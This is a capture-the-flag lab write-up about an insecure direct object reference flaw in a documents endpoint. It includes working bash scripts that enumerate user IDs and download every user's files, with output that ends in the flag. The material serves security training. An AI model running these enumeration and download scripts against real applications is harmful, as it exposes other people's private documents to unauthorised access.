# 🔓 Insecure Direct Object Reference (IDOR) Vulnerability Write-Up
## 🧩 Vulnerability Summary
An IDOR vulnerability was discovered on a web application hosted at http://83.136.252.13:40028. The flaw allows unauthorized users to access and enumerate documents belonging to other users by manipulating a uid parameter sent via POST requests.

![image](https://github.com/user-attachments/assets/a8532a20-279a-4743-9614-ae896dd84122)

### 🕵️‍♂️ Reconnaissance
Upon visiting the homepage, a JavaScript function was found:

```bash
 <script>
    function getDocuments(uid) {
      $.redirect("/documents.php", {
        uid: uid,
      }, "POST", "_self");
    }
  </script>
```
This indicated that the /documents.php endpoint accepted a POST request with a uid parameter to retrieve user-specific documents.

### 📥 Endpoint Behavior
When manually visiting /documents.php via browser (or by crafting a POST request), document links were returned within anchor (<a>) tags, such as:

```bash
<li>
      <input type="checkbox" id="trigger-views" checked="checked">
      <label for="trigger-views">Documents</label>
      <ul class="pure-tree">
        <li class='pure-tree_link'><a href='/documents/Invoice_1_09_2021.pdf' target='_blank'>Invoice</a></li>
        <li class='pure-tree_link'><a href='/documents/Report_1_10_2021.pdf' target='_blank'>Report</a></li>
    </ul>
</li>
```

The naming format followed:
[DocumentType]_[UID]_[Month]_[Year].pdf

![image](https://github.com/user-attachments/assets/1e59c7b9-11d2-44fd-ade8-451790df7e13)
This suggested that the application returned files belonging to the UID provided, without validating the requester's authorization.

### 🧪 Exploitation

Let's understand the given bash file in the learning module.

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

A custom Bash script was created to enumerate files by iterating over uid values and parsing the response:

```bash
#!/bin/bash

url="http://94.237.51.163:38179/documents.php"
max_uid=20

# Print header
echo -e "UID | FILE NAME 1 | FILE NAME 2 | FILE NAME 3"

for uid in $(seq 1 $max_uid); do
    echo "[*] Checking UID: $uid" >&2

    # Send POST request and get matching files
    files=$(curl -s -X POST -d "uid=$uid" "$url" | grep -oP "/documents/\K[^']+\.[a-zA-Z0-9]+" | sort -u)

    # Format row: UID | file1 | file2 | file3...
    row="$uid"
    for file in $files; do
        row="$row | $file"
    done

    echo -e "$row"
done
```

Save it as idor_enum_download_all.sh
Make it executable: chmod +x idor_enum_download_all.sh
Run it: ./idor_enum_download_all.sh

### Output

```bash
UID | FILE NAME 1 | FILE NAME 2 | FILE NAME 3
[*] Checking UID: 1
1 | Invoice_1_09_2021.pdf | Report_1_10_2021.pdf
[*] Checking UID: 2
2 | Invoice_2_08_2020.pdf | Report_2_12_2020.pdf
[*] Checking UID: 3
3 | Invoice_3_06_2020.pdf | Report_3_01_2020.pdf
[*] Checking UID: 4
4 | Invoice_4_07_2021.pdf | Report_4_11_2020.pdf
[*] Checking UID: 5
5 | Invoice_5_06_2020.pdf | Report_5_11_2021.pdf
[*] Checking UID: 6
6 | Invoice_6_09_2019.pdf | Report_6_09_2020.pdf
[*] Checking UID: 7
7 | Invoice_7_11_2021.pdf | Report_7_01_2020.pdf
[*] Checking UID: 8
8 | Invoice_8_06_2020.pdf | Report_8_12_2020.pdf
[*] Checking UID: 9
9 | Invoice_9_04_2019.pdf | Report_9_05_2020.pdf
[*] Checking UID: 10
10 | Invoice_10_03_2020.pdf | Report_10_05_2021.pdf
[*] Checking UID: 11
11 | Invoice_11_03_2021.pdf | Report_11_04_2021.pdf
[*] Checking UID: 12
12 | Invoice_12_02_2020.pdf | Report_12_04_2020.pdf
[*] Checking UID: 13
13 | Invoice_13_06_2020.pdf | Report_13_01_2020.pdf
[*] Checking UID: 14
14 | Invoice_14_01_2021.pdf | Report_14_01_2020.pdf
[*] Checking UID: 15
15 | flag_11dfa168ac8eb2958e38425728623c98.txt | Invoice_15_11_2020.pdf | Report_15_01_2020.pdf
[*] Checking UID: 16
16 | Invoice_16_12_2021.pdf | Report_16_01_2021.pdf
[*] Checking UID: 17
17 | Invoice_17_11_2021.pdf | Report_17_06_2021.pdf
[*] Checking UID: 18
18 | Invoice_18_12_2020.pdf | Report_18_01_2020.pdf
[*] Checking UID: 19
19 | Invoice_19_06_2020.pdf | Report_19_08_2020.pdf
[*] Checking UID: 20
20 | Invoice_20_06_2020.pdf | Report_20_01_2021.pdf
```
![image](https://github.com/user-attachments/assets/e478bdd0-82c4-4634-ba83-897d95c862a5)

### 🏁 Flag Found

Using the script, UID 15 returned an unexpected .txt file, which turned out to be a flag:
cat downloads/flag_11dfa168ac8eb2958e38425728623c98.txt
